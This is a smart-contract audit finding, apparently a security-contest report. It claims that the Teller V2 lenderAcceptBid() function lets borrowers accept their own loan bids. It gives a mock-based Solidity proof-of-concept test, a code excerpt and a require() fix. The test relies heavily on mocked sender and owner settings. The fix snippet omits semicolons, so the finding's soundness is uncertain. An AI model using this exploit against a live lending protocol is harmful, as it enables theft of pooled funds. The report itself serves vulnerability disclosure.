# Lack of access control in lenderAcceptBid() leads to total loss of funds.

## Summary
Any user can call the function `lenderAcceptBid()` an attacker can use this vulnerability to create bogus loans with no real collateral, accept their own bids and `borrow` funds with their bogus loan bid. Therefore leading to a total loss of funds. 

## Vulnerability Detail


To test this, place the following code block in `packages/contracts/contracts/TellerV2.sol`

```solidity

 function test_borrower_can_accept_their_own_load_bid() public {

        //setup bid 
        uint256 bidId = 1;
        setMockBid(bidId);

        tellerV2.mock_initialize(); //set address this as owner
        lendingToken.approve(address(tellerV2), 1e20);

        uint256  attackerBalanceBefore = lendingToken.balanceOf(address(receiver));

        //make address (this) be the one that makes the payment
        tellerV2.setMockMsgSenderForMarket(address(this));
        tellerV2.mock_setBidState(bidId, BidState.PENDING);
        tellerV2.setMarketRegistrySuper(address(marketRegistryMock));
        marketRegistryMock.setMarketFeeRecipient(address(feeRecipient));
        tellerV2.setCollateralManagerSuper(address(collateralManagerMock));

        //borrower (receiver) accpets their own loan bid and recieves loan  
        vm.prank(address(receiver));
        tellerV2.lenderAcceptBid(bidId);
        vm.stopPrank();

        uint256  attackerBalanceAfter = lendingToken.balanceOf(address(receiver));
        assertGt(attackerBalanceAfter, attackerBalanceBefore);
    }

```

The result of the test shows, the borrower (receiver) of the loan is able to accept their own loan. According to the documentation, only lenders should be able to [accept loan bids](https://docs.teller.org/teller-v2/protocol/lenders/accepting-a-loan). 


Let us examine the `lenderAcceptBid()` function 


```solidity
      // Retrieve bid
        Bid storage bid = bids[_bidId];

        address sender = _msgSenderForMarket(bid.marketplaceId);

        (bool isVerified, ) = marketRegistry.isVerifiedLender(
            bid.marketplaceId,
            sender
        );
```


This condition gets the lender `sender` for a particular marketplaceId and checks if the user for the marketplace is the same has the lender, ``` (bool isVerified, ) ``` but it does not check if the caller of the function `(msg.sender)` is the verified lender authorised to accept loan bids.



## Impact

Attacker creates loan bids with bogus/no collateral and then accepts their own bids, instantly allowing them to borrow for free.

## Tool used

Manual Review

## Recommendation

Only the lender should be able to call `lenderAcceptBid()`. Add access control to the function via `require()` like so 


```solidity
address lender =    bid.lender

require(msg.sender == lender, "Only lender can accept bids")
```
